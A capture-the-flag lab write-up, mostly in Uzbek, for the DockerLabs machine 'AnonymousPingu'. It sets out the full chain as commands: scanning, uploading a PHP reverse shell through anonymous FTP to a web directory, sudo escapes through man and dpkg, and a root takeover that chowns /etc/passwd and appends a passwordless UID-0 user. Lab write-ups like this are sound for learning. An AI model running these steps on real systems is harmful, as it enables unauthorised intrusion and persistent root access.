# AnonymousPingu-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 21 ftp, 80 http
Users: gladys, pingu, root
Vulnerability: Anonymous FTP + Unrestricted File Upload → RCE, sudo misconfiguration chain
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashinamiz nomi `AnonymousPingu`. Ochiq portlarni aniqladim:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

- 21 FTP
- 80 HTTP

80 portda ishchi buyurtma qilish sayti ishlab turibti. Feroxbuster bilan qo'shimcha sahifalarni qidirdim:

```bash
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

`/upload` katalogi topildi. FTP ga anonymous sifatida ulandim — muvofaqiyatli bo'ldi.

---

# 2. Exploitation

FTP da ham `/upload` papkasi bor, va har kim fayl yuklashi mumkin. Reverse shell faylini tayyorladim:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

IP va port sozlab, FTP orqali yukladim:

```bash
ftp 172.17.0.2
cd upload
put shell.php
```

---

# 3. Initial Access

Netcat listener ochib, brauzerdan `http://172.17.0.2/upload/shell.php` ga kirdim — `www-data` sheli keldi.

`sudo -l` bilan `www-data`ning huquqlarini tekshirdim. `/usr/bin/man` ni `pingu` nomidan ishga tushirish mumkin ekan:

```bash
sudo -u pingu /usr/bin/man man
!/bin/bash
```

`pingu` sheliga o'tdim.

---

# 4. Privilege Escalation

`pingu`dan `gladys`ga: `/usr/bin/dpkg` ni `gladys` nomidan ishga tushirish mumkin:

```bash
sudo -u gladys /usr/bin/dpkg -l
!/bin/bash
```

`gladys`dan `root`ga: `/usr/bin/chown` ni root nomidan ishga tushirish mumkin. `/etc/passwd` faylini `gladys`ga berdim va root user yaratdim:

```bash
sudo /usr/bin/chown gladys:gladys /etc/passwd
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

Root huquqi olindi!

---

**Mashina muvofaqiyatli yechildi!**
